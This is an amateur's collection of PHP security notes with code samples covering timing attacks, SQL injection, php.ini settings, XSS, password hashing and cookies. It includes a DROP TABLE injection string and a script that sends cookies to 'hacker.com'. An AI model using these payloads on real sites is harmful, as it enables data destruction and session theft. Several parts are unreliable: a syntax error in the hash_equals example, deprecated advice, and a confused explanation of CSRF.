### PHP security collection
I am not an expert, just somemone who collects security vulnerabilities!

#### Genral links
https://github.com/paragonie/awesome-appsec#php

https://www.udemy.com/course/php-security/

#### Timing attack

String compare operators return immediately if the length is not the same:
So you could see if one length takes longer than other, based on that you can get the length. The string compare operator return immediately if the a character is wrong, so based on that: you can get the character that takes the longest and that this is the right character.

```
if ($_POST["password"] !== "Password") {
    return false;
}
```
Even if the time difference is so little and ther is network jitter: why risk it. Use hash_equals($known_string, $user_string), which doesnt leak time difference (only for getting the length).
```
if (hash_equals("Password", $_POST["password"]) {
    return true;
}
```

[Link on topic](https://blog.ircmaxell.com/2014/11/its-all-about-time.html)

#### Insufficient Randomness

Dont use mt_rand() . Use one of the following:

* RandomLib
* random_bytes($length) (PHP 7, or available in PHP 5 via random_compat)
* Raw bytes read from /dev/urandom
* mcrypt_create_iv($length, MCRYPT_DEV_URANDOM);
* openssl_random_pseudo_bytes($length);

```
$token = bin2hex(openssl_random_pseudo_bytes($length));
```

[Link on topic](https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence)

#### SQL injection
```
$userQuery = $con->query("SELECT * FROM users WHERE email = '$email' ");
```

If user input is:
''; DROP TABLE posts; --
This will drop the table posts.

To avoid this, use prepare statement.
```
$userQuery = $con->prepare("SELECT * FROM users WHERE email = :email");
$userQuery->execute([
    'email' => $email
]);
```
[PDO tutorial](https://phpdelusions.net/pdo)

#### PHP ini

```
display_errors=Off ;hides possible data leaks

log_errors=On ;this two lines log all errors in given file
error_log=/var/log/httpd/php_scripts_error.log

file_uploads=Off ;if file_uploads not neaded, disalow it

file_uploads=On ; if needed, set max size
; user can only upload upto 1MB via php
upload_max_filesize=1M

expose_php=Off ;stop leaking php version

allow_url_fopen=Off ; with that reading file functions cant read urls
allow_url_include=Off

sql.safe_mode=On ; if turned on: mysql_connect() and mysql_pconnect() 
; ignore any arguments passed to them

post_max_size=1K ; sets max porst request

max_execution_time =  30 ; sets limits in seconds
max_input_time = 30
memory_limit = 40M
```

[php.ini and more](https://www.cyberciti.biz/tips/php-security-best-practices-tutorial.html)
#### Cross-site scripting (XSS)
XSS is an injection attack. If you have some type of form, that uploads data and try to show this data as html code, you can insert javascript. For example: you can commit a comment and you show this comment as html, you can insert into the comment javscript: which will, when inserted, be ecexuted. You could insert this "harmless" code:
```
<script>
window.alert("Hello i am inserted")
</script>
```
To see how dangerous XSS is, look at that:
```
<script>
window.location = "http://hacker.com/hack.php?cookie=" + escape(document.cookie)
</script>
```
See, you can steal cookies: which can have eccess tokens.

When insert text with javascript use instead of innerHTML, textContent. When echo in php fetch the echo content out of htmlspecialchars($_POST["body"]).
```
echo htmlspecialchars($_POST["body"]);
```

When insert text with javascript use instead of innerHTML, textContent.

#### Password hashing
Dont use md5 hashing. It is easily crackable.
```
md5($_POST["password"]) //dont do this
```
Use password_hash($password).
```
password_hash($password, PASSWORD_DEFAULT) // this hashes the password
```
[Password hash manual](https://www.php.net/manual/de/function.password-hash.php) <br>
Use password_verify to verify the password.
```
$result = password_verify($password, $hash);
```
#### Hiding directories
To hide directories create in the a .htacess file, in the directorie and then it cant be eccessed. Put this in there.
```
Options -Indexes
```
#### Http only cookie
```
setcookie("token", $tokenCookie, NULL, "/", NULL, TRUE, TRUE);
```
The last true sets the cookie to http only. Makes it not eccessable from javascript.

#### Cross-Site Request Forgery (CSRG)
I didnt understand CSRG, because its attack where you basically open a not protected public php file to perform a action. It should be clear to protect you php files, from random eccess therby enabling actions, with a handshake between your browser and server, with authorisation-methods such as: Cookies, Sessions, JWTs.
